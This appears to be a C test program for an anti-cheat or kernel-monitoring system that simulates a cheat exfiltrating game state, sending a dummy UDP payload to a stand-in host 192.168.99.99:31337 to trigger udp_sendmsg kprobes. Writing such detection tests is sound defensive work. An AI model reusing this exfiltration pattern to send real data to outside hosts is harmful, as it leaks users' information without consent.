/*
 * net_exfil - Test cheat sending game state over UDP
 *
 * Sends an identifying payload to 192.168.99.99:31337 via UDP.
 * Exercises the network monitoring kprobes (udp_sendmsg).
 *
 * Usage: net_exfil
 *
 * Reads PID from the game info file (consistency with other cheats).
 * The UDP send will succeed even if the destination is unreachable
 * (UDP is connectionless). The kprobe fires on sendto().
 */

#include <arpa/inet.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "../game/game_state.h"

#define EXFIL_HOST "192.168.99.99"
#define EXFIL_PORT 31337

static int parse_info_file(pid_t *pid)
{
	FILE *f = fopen(GAME_INFO_FILE, "r");
	if (!f) {
		fprintf(stderr, "[net_exfil] Cannot open %s: %s\n",
			GAME_INFO_FILE, strerror(errno));
		return -1;
	}

	long p;
	if (fscanf(f, "%ld", &p) != 1 || p <= 0) {
		fprintf(stderr, "[net_exfil] Invalid info file format\n");
		fclose(f);
		return -1;
	}
	fclose(f);

	*pid = (pid_t)p;
	return 0;
}

int main(void)
{
	pid_t game_pid = 0;

	if (parse_info_file(&game_pid) != 0) {
		fprintf(stderr, "[net_exfil] No game info file, "
			"using PID=0 as placeholder\n");
	}

	printf("[net_exfil] Game PID: %d\n", game_pid);
	printf("[net_exfil] Sending game state to %s:%d via UDP\n",
	       EXFIL_HOST, EXFIL_PORT);

	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) {
		fprintf(stderr, "[net_exfil] socket() failed: %s\n",
			strerror(errno));
		return EXIT_FAILURE;
	}

	struct sockaddr_in dest;
	memset(&dest, 0, sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_port = htons(EXFIL_PORT);
	if (inet_pton(AF_INET, EXFIL_HOST, &dest.sin_addr) != 1) {
		fprintf(stderr, "[net_exfil] inet_pton failed\n");
		close(sock);
		return EXIT_FAILURE;
	}

	/* Build exfiltration payload */
	char payload[128];
	int len = snprintf(payload, sizeof(payload),
			   "OWLBEAR_EXFIL pid=%d hp=9999 pos=0,0,0 "
			   "aim=42.0,42.0 score=999999",
			   game_pid);

	ssize_t sent = sendto(sock, payload, (size_t)len, 0,
			      (struct sockaddr *)&dest, sizeof(dest));

	if (sent < 0) {
		fprintf(stderr, "[net_exfil] sendto() failed: %s\n",
			strerror(errno));
		close(sock);
		return EXIT_FAILURE;
	}

	printf("[CHEAT] Exfiltrated %zd bytes to %s:%d\n",
	       sent, EXFIL_HOST, EXFIL_PORT);
	printf("[net_exfil] Done.\n");

	close(sock);
	return EXIT_SUCCESS;
}
